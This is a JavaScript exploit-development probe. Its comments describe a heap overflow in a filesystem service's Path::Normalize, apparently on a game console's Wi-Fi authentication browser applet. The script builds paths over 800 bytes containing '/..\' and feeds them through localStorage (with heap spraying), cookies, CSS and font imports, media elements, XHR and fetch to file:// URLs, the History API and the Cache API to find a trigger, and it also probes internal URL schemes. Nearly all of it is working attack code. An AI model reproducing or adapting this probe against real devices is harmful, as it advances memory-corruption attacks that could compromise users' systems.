// fs service Path::Normalize overflow trigger probe
// The fs service has a heap overflow in Path::Normalize when processing paths > 0x301 bytes
// containing a parent-directory component with backslash (/..\)
// WifiWebAuthApplet has fsp-srv access + SystemSaveData permission
// Goal: find JS operations that pass user-controlled paths to the fs service
(function() {
'use strict';
var results = [];

// Build overflow paths: > 0x301 (769) bytes with /..\  component
function makeOverflowPath(prefix, totalLen) {
  var pad = totalLen - prefix.length - 5; // 5 for /..\X
  if (pad < 0) pad = 0;
  return prefix + '/' + 'A'.repeat(pad) + '/..\\';
}

var OVERFLOW_LEN = 800; // well over 0x301

// Test 1: localStorage with long keys (save data = filesystem operations)
// localStorage keys become paths in the save data filesystem
try {
  var r1 = {};

  // First: normal long key (no special chars)
  try {
    var normalKey = 'N'.repeat(OVERFLOW_LEN);
    localStorage.setItem(normalKey, 'test1');
    r1.normalLong = localStorage.getItem(normalKey) === 'test1' ? 'stored' : 'mismatch';
    localStorage.removeItem(normalKey);
  } catch(e) {
    r1.normalLong = e.name + ':' + e.message.substring(0, 60);
  }

  // Key with backslash (the critical char for Path::Normalize bug)
  try {
    var bsKey = 'K' + '/..\\' + 'B'.repeat(OVERFLOW_LEN);
    localStorage.setItem(bsKey, 'test2');
    r1.backslashKey = localStorage.getItem(bsKey) === 'test2' ? 'stored' : 'mismatch';
    localStorage.removeItem(bsKey);
  } catch(e) {
    r1.backslashKey = e.name + ':' + e.message.substring(0, 60);
  }

  // Key that exactly mimics the overflow path format
  try {
    var overflowKey = makeOverflowPath('trigger', OVERFLOW_LEN);
    localStorage.setItem(overflowKey, 'test3');
    r1.overflowKey = localStorage.getItem(overflowKey) === 'test3' ? 'stored' : 'mismatch';
    localStorage.removeItem(overflowKey);
  } catch(e) {
    r1.overflowKey = e.name + ':' + e.message.substring(0, 60);
  }

  // Many small entries to spray fs heap, then the overflow key
  try {
    for (var i = 0; i < 50; i++) {
      localStorage.setItem('spray_' + i, 'x'.repeat(64));
    }
    r1.sprayCount = 50;

    // Now set the overflow key
    var triggerKey = 'A'.repeat(750) + '/..\\' + 'X'.repeat(50);
    localStorage.setItem(triggerKey, 'payload');
    r1.sprayThenOverflow = 'stored';
    localStorage.removeItem(triggerKey);

    // Cleanup spray
    for (var i = 0; i < 50; i++) {
      localStorage.removeItem('spray_' + i);
    }
  } catch(e) {
    r1.sprayThenOverflow = e.name + ':' + e.message.substring(0, 60);
  }

  results.push({name: 'ls_overflow', data: r1});
} catch(e) {
  results.push({name: 'ls_overflow', error: e.message.substring(0, 80)});
}

// Test 2: sessionStorage with long keys
try {
  var r2 = {};
  try {
    var ssKey = 'S'.repeat(OVERFLOW_LEN) + '/..\\';
    sessionStorage.setItem(ssKey, 'test');
    r2.longSS = sessionStorage.getItem(ssKey) === 'test' ? 'stored' : 'mismatch';
    sessionStorage.removeItem(ssKey);
  } catch(e) {
    r2.longSS = e.name + ':' + e.message.substring(0, 60);
  }
  results.push({name: 'ss_overflow', data: r2});
} catch(e) {
  results.push({name: 'ss_overflow', error: e.message.substring(0, 80)});
}

// Test 3: Cookie with long path/name (cookies might use fs for persistence)
try {
  var r3 = {};

  // Long cookie name
  try {
    var cookieName = 'C'.repeat(OVERFLOW_LEN);
    document.cookie = cookieName + '=val;path=/';
    r3.longCookieName = document.cookie.indexOf(cookieName) >= 0 ? 'set' : 'not_set';
  } catch(e) {
    r3.longCookieName = e.message.substring(0, 60);
  }

  // Cookie with backslash in path
  try {
    document.cookie = 'bsc=1;path=/' + 'D'.repeat(750) + '/..\\';
    r3.backslashCookiePath = 'set_attempted';
  } catch(e) {
    r3.backslashCookiePath = e.message.substring(0, 60);
  }

  results.push({name: 'cookie_overflow', data: r3});
} catch(e) {
  results.push({name: 'cookie_overflow', error: e.message.substring(0, 80)});
}

// Test 4: CSS @import and <link> with long file:// paths
try {
  var r4 = {};

  // file:// with long path containing /..\
  var longFilePath = 'file:///' + 'E'.repeat(750) + '/..\\' + 'F'.repeat(50) + '.css';

  try {
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = longFilePath;
    link.onerror = function() { r4.linkErr = true; };
    link.onload = function() { r4.linkLoad = true; };
    document.head.appendChild(link);
    r4.linkInjected = true;
    r4.linkHref = link.href.length;
    setTimeout(function() { link.remove(); }, 500);
  } catch(e) {
    r4.linkErr = e.message.substring(0, 60);
  }

  // @import via style element
  try {
    var style = document.createElement('style');
    style.textContent = '@import url("' + longFilePath + '");';
    document.head.appendChild(style);
    r4.importInjected = true;
    setTimeout(function() { style.remove(); }, 500);
  } catch(e) {
    r4.importErr = e.message.substring(0, 60);
  }

  // @font-face with long file:// src
  try {
    var fontStyle = document.createElement('style');
    var fontPath = 'file:///' + 'G'.repeat(750) + '/..\\' + 'font.woff2';
    fontStyle.textContent = '@font-face { font-family: "probe"; src: url("' + fontPath + '"); } .probe { font-family: "probe"; }';
    document.head.appendChild(fontStyle);
    var fontDiv = document.createElement('div');
    fontDiv.className = 'probe';
    fontDiv.textContent = 'test';
    document.body.appendChild(fontDiv);
    fontDiv.offsetWidth; // force layout
    r4.fontFaceInjected = true;
    setTimeout(function() { fontStyle.remove(); fontDiv.remove(); }, 500);
  } catch(e) {
    r4.fontFaceErr = e.message.substring(0, 60);
  }

  results.push({name: 'css_file_overflow', data: r4});
} catch(e) {
  results.push({name: 'css_file_overflow', error: e.message.substring(0, 80)});
}

// Test 5: <img>, <script>, <video>, <audio> with long file:// paths
try {
  var r5 = {};

  var elements = [
    {tag: 'img', attr: 'src', ext: '.png'},
    {tag: 'script', attr: 'src', ext: '.js'},
    {tag: 'video', attr: 'src', ext: '.mp4'},
    {tag: 'audio', attr: 'src', ext: '.ogg'},
    {tag: 'iframe', attr: 'src', ext: '.html'}
  ];

  elements.forEach(function(el) {
    try {
      var elem = document.createElement(el.tag);
      var path = 'file:///' + 'H'.repeat(750) + '/..\\' + el.tag + el.ext;
      elem[el.attr] = path;
      elem.style.display = 'none';
      elem.onerror = function() {};
      document.body.appendChild(elem);
      r5[el.tag] = {injected: true, hrefLen: elem[el.attr].length};
      setTimeout(function() { elem.remove(); }, 500);
    } catch(e) {
      r5[el.tag] = e.message.substring(0, 60);
    }
  });

  results.push({name: 'element_file_overflow', data: r5});
} catch(e) {
  results.push({name: 'element_file_overflow', error: e.message.substring(0, 80)});
}

// Test 6: XHR to file:// with long paths
try {
  var r6 = {};

  // Sync XHR to file:// (might be blocked but worth testing)
  var xhrPaths = [
    'file:///vol/content/' + 'I'.repeat(750) + '/..\\test',
    'file:///save/' + 'J'.repeat(750) + '/..\\test',
    'file:///tmp/' + 'K'.repeat(750) + '/..\\test',
    'file:///vol/save/' + 'L'.repeat(750) + '/..\\test'
  ];

  xhrPaths.forEach(function(path) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', path, false);
      x.send();
      r6[path.substring(0, 20)] = {status: x.status, len: x.responseText.length};
    } catch(e) {
      r6[path.substring(0, 20)] = e.name + ':' + e.message.substring(0, 50);
    }
  });

  results.push({name: 'xhr_file_overflow', data: r6});
} catch(e) {
  results.push({name: 'xhr_file_overflow', error: e.message.substring(0, 80)});
}

// Test 7: fetch() to file:// with long paths
try {
  var r7 = {};
  var fetchPaths = [
    'file:///vol/content/' + 'M'.repeat(750) + '/..\\test',
    'file:///save/' + 'N'.repeat(750) + '/..\\test'
  ];

  var pending7 = fetchPaths.length;
  fetchPaths.forEach(function(path) {
    try {
      fetch(path).then(function(resp) {
        r7[path.substring(0, 20)] = {status: resp.status, type: resp.type};
        if (--pending7 === 0) results.push({name: 'fetch_file_overflow', data: r7});
      }).catch(function(e) {
        r7[path.substring(0, 20)] = 'err:' + String(e).substring(0, 50);
        if (--pending7 === 0) results.push({name: 'fetch_file_overflow', data: r7});
      });
    } catch(e) {
      r7[path.substring(0, 20)] = 'sync:' + e.message.substring(0, 50);
      pending7--;
    }
  });
} catch(e) {
  results.push({name: 'fetch_file_overflow', error: e.message.substring(0, 80)});
}

// Test 8: window.open / location with long paths
try {
  var r8 = {};

  // Create a link element and check if href gets normalized
  var a = document.createElement('a');
  a.href = 'file:///' + 'O'.repeat(800) + '/..\\test';
  r8.normalizedHref = a.href.length;
  r8.hrefContainsBackslash = a.href.indexOf('\\') >= 0;
  r8.hrefStart = a.href.substring(0, 30);
  r8.hrefEnd = a.href.substring(a.href.length - 30);

  // Check protocol/pathname parsing
  r8.protocol = a.protocol;
  r8.pathname = a.pathname ? a.pathname.substring(0, 30) + '...' + a.pathname.substring(a.pathname.length - 30) : 'none';
  r8.pathnameLen = a.pathname ? a.pathname.length : 0;

  results.push({name: 'href_normalization', data: r8});
} catch(e) {
  results.push({name: 'href_normalization', error: e.message.substring(0, 80)});
}

// Test 9: History API with long URLs (history state uses filesystem for persistence?)
try {
  var r9 = {};

  try {
    var longUrl = location.origin + '/' + 'P'.repeat(800) + '/..\\test';
    history.pushState({}, '', longUrl);
    r9.pushed = true;
    r9.newHref = location.href.length;
    history.back();
    r9.backedOut = true;
  } catch(e) {
    r9.pushErr = e.name + ':' + e.message.substring(0, 60);
  }

  results.push({name: 'history_long_url', data: r9});
} catch(e) {
  results.push({name: 'history_long_url', error: e.message.substring(0, 80)});
}

// Test 10: Cache API (if available)
try {
  var r10 = {};
  if (typeof caches !== 'undefined') {
    r10.available = true;
    try {
      caches.open('probe').then(function(cache) {
        var longUrl = 'http://test/' + 'Q'.repeat(800) + '/..\\data';
        cache.put(new Request(longUrl), new Response('test')).then(function() {
          r10.stored = true;
        }).catch(function(e) {
          r10.storeErr = String(e).substring(0, 60);
        });
      }).catch(function(e) {
        r10.openErr = String(e).substring(0, 60);
      });
    } catch(e) {
      r10.err = e.message.substring(0, 60);
    }
  } else {
    r10.available = false;
  }
  results.push({name: 'cache_api', data: r10});
} catch(e) {
  results.push({name: 'cache_api', error: e.message.substring(0, 80)});
}

// Test 11: WebKit internal URLs
try {
  var r11 = {};

  var internalUrls = [
    'applewebdata://test',
    'webkit-fake-url://test',
    'x-apple-data-detectors://test',
    'resource:///',
    'chrome:///',
    'internal:///'
  ];

  internalUrls.forEach(function(u) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', u, false);
      x.send();
      r11[u] = {status: x.status, len: x.responseText.length};
    } catch(e) {
      r11[u] = e.name.substring(0, 20);
    }
  });

  results.push({name: 'internal_urls', data: r11});
} catch(e) {
  results.push({name: 'internal_urls', error: e.message.substring(0, 80)});
}

// Test 12: Blob + createObjectURL stress (Blob URLs might use fs internally)
try {
  var r12 = {};

  // Create many blobs and URLs
  var urls = [];
  for (var i = 0; i < 100; i++) {
    var b = new Blob([new ArrayBuffer(4096)], {type: 'application/octet-stream'});
    urls.push(URL.createObjectURL(b));
  }
  r12.created = urls.length;

  // Revoke in reverse order
  for (var i = urls.length - 1; i >= 0; i--) {
    URL.revokeObjectURL(urls[i]);
  }
  r12.revoked = urls.length;

  results.push({name: 'blob_stress', data: r12});
} catch(e) {
  results.push({name: 'blob_stress', error: e.message.substring(0, 80)});
}

return new Promise(function(resolve) {
  setTimeout(function() {
    resolve(JSON.stringify(results));
  }, 3000);
});
})();
